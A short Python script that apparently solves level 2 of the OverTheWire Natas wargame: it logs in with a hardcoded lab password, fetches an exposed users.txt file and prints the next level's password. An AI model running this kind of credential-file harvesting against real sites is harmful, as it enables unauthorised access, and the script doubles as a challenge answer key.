import requests
import re

username = "natas2"
password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"

url = "http://natas2.natas.labs.overthewire.org/"

response = requests.get(url+"files/users.txt",auth=(username,password))
content = response.text
print(re.findall("natas3:(.*)",content)[0])